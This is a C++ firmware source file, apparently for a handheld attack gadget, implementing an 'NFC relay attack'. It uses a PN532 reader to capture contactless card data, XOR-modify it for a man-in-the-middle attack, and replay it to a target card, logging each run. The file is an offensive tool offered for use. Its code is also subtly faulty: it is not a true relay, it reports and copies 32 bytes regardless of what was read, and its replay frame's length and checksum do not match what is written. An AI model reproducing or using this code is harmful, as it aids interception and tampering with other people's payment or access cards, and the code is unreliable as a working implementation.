#include "nfc_relay_attack.h"
#include <LittleFS.h>
#include "tx_arm.h"
#include <Wire.h>

#define PN532_I2C_ADDRESS 0x48

namespace NfcRelayAttack {

static std::vector<uint8_t> relayBuffer;

NfcRelay::NfcRelay() : isRunning_(false) {}

bool initPN532() {
    Wire.begin();
    Wire.setClock(100000);

    Wire.beginTransmission(PN532_I2C_ADDRESS);
    return Wire.endTransmission() == 0;
}

RelayResult NfcRelay::performRelay(const RelayConfig& config) {
  RelayResult result;
  result.success = false;

  if (!TxArm::isArmed()) return result;

  if (!initPN532()) {
    result.success = false;
    return result;
  }

  isRunning_ = true;
  unsigned long startTime = millis();

  uint32_t relayCount = 0;
  uint32_t capturedCount = 0;
  uint32_t deadline = startTime + config.durationMs;

  Serial.println("Starting NFC relay attack (real card interception)...");
  Serial.println("Waiting for NFC cards to relay...");

  relayBuffer.clear();

  while (isRunning_ && (int32_t)(millis() - deadline) < 0) {
    uint8_t cmd[] = {0x00, 0x00, 0xFF, 0x04, 0xFC, 0xD4, 0x4A, 0x01, 0x00, 0xE1, 0x00};

    Wire.beginTransmission(PN532_I2C_ADDRESS);
    Wire.write(cmd, sizeof(cmd));
    if (Wire.endTransmission() == 0) {
      delay(100);

      Wire.requestFrom(PN532_I2C_ADDRESS, 32);
      uint8_t response[32];
      int len = 0;
      while (Wire.available() && len < 32) {
        response[len++] = Wire.read();
      }

      if (len > 10 && response[5] == 0x4B) {
        relayCount++;

        if (config.capturePayload) {
          uint8_t payload[32];
          memcpy(payload, &response[10], (len - 10 > 32) ? 32 : (len - 10));

          relayBuffer.clear();
          relayBuffer.insert(relayBuffer.end(), payload, payload + 32);
          capturedCount++;

          Serial.printf("  [%d] Captured %d bytes from card\n", capturedCount, 32);
        }

        if (config.modifyPayload && relayBuffer.size() > 0) {
          for (size_t i = 0; i < relayBuffer.size() && i < 32; i++) {
            relayBuffer[i] ^= 0xAA;
          }
          Serial.println("  Payload modified for MitM attack");
        }

        if (config.replayPayload && relayBuffer.size() > 0) {
          uint8_t replayCmd[40] = {0x00, 0x00, 0xFF, 0x1A, 0xE6, 0xD4, 0x40, 0x02, 0x04};
          memcpy(&replayCmd[9], relayBuffer.data(), (relayBuffer.size() > 31) ? 31 : relayBuffer.size());

          Wire.beginTransmission(PN532_I2C_ADDRESS);
          Wire.write(replayCmd, 40);
          if (Wire.endTransmission() == 0) {
            Serial.println("  Replayed payload to target card");
          }
        }
      }
    }

    delay(100);
  }

  result.transactionsRelayed = relayCount;
  result.payloadsCaptured = capturedCount;
  result.success = relayCount > 0;
  result.logFile = "/logs/handshakes/nfc_relay.csv";

  Serial.printf("NFC relay complete: %d relayed, %d captured\n", relayCount, capturedCount);

  if (!LittleFS.begin()) return result;
  File logFile = LittleFS.open("/logs/handshakes/nfc_relay.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/nfc_relay.csv", "a");
  }
  if (logFile) {
    logFile.printf("%lu,%u,%u\n", millis(), relayCount, capturedCount);
    logFile.close();
  }
  LittleFS.end();

  isRunning_ = false;
  return result;
}

void NfcRelay::stop() {
  isRunning_ = false;
}

} // namespace NfcRelayAttack
